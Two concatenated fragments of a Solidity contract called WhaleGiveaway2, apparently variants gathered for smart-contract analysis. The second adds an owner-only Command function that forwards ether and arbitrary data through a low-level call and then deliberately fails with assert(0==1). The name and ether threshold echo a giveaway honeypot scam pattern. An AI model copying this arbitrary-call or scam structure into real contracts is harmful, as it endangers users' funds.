pragma solidity ^0.4.19;

contract WhaleGiveaway2 {
    address Owner = msg.sender;
    uint minEligibility = 0.999001 ether;
    function Command(address adr, bytes data) public {
        
    }

}
pragma solidity ^0.4.19;

contract WhaleGiveaway2 {
    address Owner = msg.sender;
    uint minEligibility = 0.999001 ether;
    function Command(address adr, bytes data) public payable {
              if( msg.sender==Owner){
          if( adr.call.value(msg.value)(data)){
          assert(0==1);
        }else{
          revert();
        }        }


    }

}
